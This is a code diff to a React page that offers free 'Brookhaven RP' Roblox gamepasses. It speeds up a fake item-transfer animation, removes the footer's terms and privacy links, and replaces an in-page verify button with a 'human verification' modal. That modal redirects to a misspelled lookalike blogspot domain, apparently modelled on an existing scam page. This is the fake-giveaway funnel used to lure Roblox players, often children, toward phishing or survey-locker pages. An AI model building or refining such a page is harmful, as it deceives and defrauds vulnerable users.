@@ -13,6 +13,7 @@ import {
   CheckCircle2,
   ShieldCheck
 } from 'lucide-react';
+import { ClaimVerificationModal } from './ClaimVerificationModal';
 
 interface BrookhavenPageProps {
   onBack: () => void;
@@ -190,9 +191,9 @@ export const BrookhavenPage: React.FC<BrookhavenPageProps> = ({ onBack }) => {
         setTransferPhase('transferring');
         setTimeout(() => {
           setModalStep('verify');
-        }, 1800);
-      }, 1500);
-    }, 1200);
+        }, 1200);
+      }, 1000);
+    }, 1000);
   };
 
   // Generate deterministic avatar color from username
@@ -429,24 +430,10 @@ export const BrookhavenPage: React.FC<BrookhavenPageProps> = ({ onBack }) => {
             </button>
           </div>
         )}
-
-        {/* Footer */}
-        <footer className="mt-12 pt-6 pb-10 border-t border-gray-300 text-center text-xs text-gray-500">
-          <div className="flex flex-wrap justify-center gap-4 mb-3 font-medium text-gray-600">
-            <span>About Us</span>
-            <span>·</span>
-            <span>Jobs</span>
-            <span>·</span>
-            <span>Terms of Service</span>
-            <span>·</span>
-            <span>Privacy Policy</span>
-          </div>
-          <p>© 2026 Brookhaven RP · Roblox Gamepasses Hub</p>
-        </footer>
       </main>
 
       {/* Brookhaven Modal matching brookhan-rp.blogspot.com */}
-      {selectedPass && (
+      {selectedPass && modalStep !== 'verify' && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-xs">
           <div className="relative bg-[#3a3a3a] text-white max-w-md w-full rounded-xl p-6 shadow-2xl text-center border border-white/10">
             {/* Close Button */}
@@ -580,34 +567,17 @@ export const BrookhavenPage: React.FC<BrookhavenPageProps> = ({ onBack }) => {
               </div>
             )}
 
-            {/* STEP 5: Verification Required */}
-            {modalStep === 'verify' && (
-              <div className="py-4 space-y-4">
-                <h2 className="text-xl font-bold">Get item</h2>
-
-                <div className="w-16 h-16 rounded-full bg-emerald-950 border-2 border-emerald-500 flex items-center justify-center mx-auto text-emerald-400">
-                  <ShieldCheck className="w-9 h-9" />
-                </div>
-
-                <div className="bg-[#2a2a2a] p-3 rounded-lg border border-white/10 text-sm text-gray-200 leading-relaxed">
-                  <span className="font-bold text-white block mb-1 text-base">Human Verification</span>
-                  To prevent bot abuse, please complete the final verification step to unlock <strong>{selectedPass.name}</strong> for <strong>@{username}</strong>.
-                </div>
-
-                <button
-                  onClick={() => {
-                    alert(`Congratulations! Pass "${selectedPass.name}" has been registered for @${username}. Enjoy Brookhaven RP!`);
-                    handleCloseModal();
-                  }}
-                  className="bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3 px-8 rounded shadow transition-all cursor-pointer text-base uppercase tracking-wide flex items-center justify-center gap-2 mx-auto"
-                >
-                  <CheckCircle2 className="w-5 h-5" />
-                  <span>Verify</span>
-                </button>
-              </div>
-            )}
           </div>
         </div>
+      )}
+
+      {/* Human Verification Modal matching exact user screenshot */}
+      {selectedPass && modalStep === 'verify' && (
+        <ClaimVerificationModal
+          isOpen={true}
+          onClose={handleCloseModal}
+          redirectUrl="https://brookhan-rp.blogspot.com/"
+        />
       )}
     </div>
   );
